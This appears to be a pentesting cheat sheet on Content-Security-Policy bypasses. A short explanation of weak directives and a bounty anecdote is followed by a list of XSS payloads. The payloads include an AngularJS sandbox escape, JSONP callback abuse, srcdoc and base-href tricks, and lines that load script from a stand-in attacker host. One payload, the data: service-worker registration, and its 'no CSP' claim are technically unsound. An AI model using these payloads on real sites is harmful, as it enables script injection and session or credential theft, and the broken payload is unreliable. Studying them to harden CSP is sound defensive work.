CSP Bypass

What CSP is

Content-Security-Policy is an allow-list delivered via HTTP header or meta tag. It restricts scripts, styles, images, frames, etc.

Why bypasses exist

Weak directives (unsafe-inline, unsafe-eval), over-permissive whitelists (CDNs with JSONP), missing fallbacks, or parser quirks (data:, blob:, srcdoc).

Where you’ll meet them

whitelist gstatic.com, script-src * .googleapis.com, missing object-src, frame-src *, base-uri missing.

Impact

Full XSS resurrection even with CSP present → same cred-steal, key-log, supply-chain.

Mini case-study

2019 Slack CSP bypass via gstatic.com + AngularJS gadget → stolen session → $3 000 bounty.

Payloads

// No nonce → inline allowed
<script>alert(1)</script>
// Angular lib on whitelist → sandbox escape
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
// Whitelist CDN has JSONP endpoint
<script src="https://target.com/jsonp?callback=alert(1)//"></script>
// Inherits parent CSP but allows inline
<iframe srcdoc="<script>alert(1)</script>"></iframe>
// Old mobile browsers still follow
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
// Worker context = no CSP
navigator.serviceWorker.register('data:application/javascript,importScripts("//att/evil.js")')
// Relative script now attacker-hosted
<base href="https://att/">
<script src="good.js"></script>
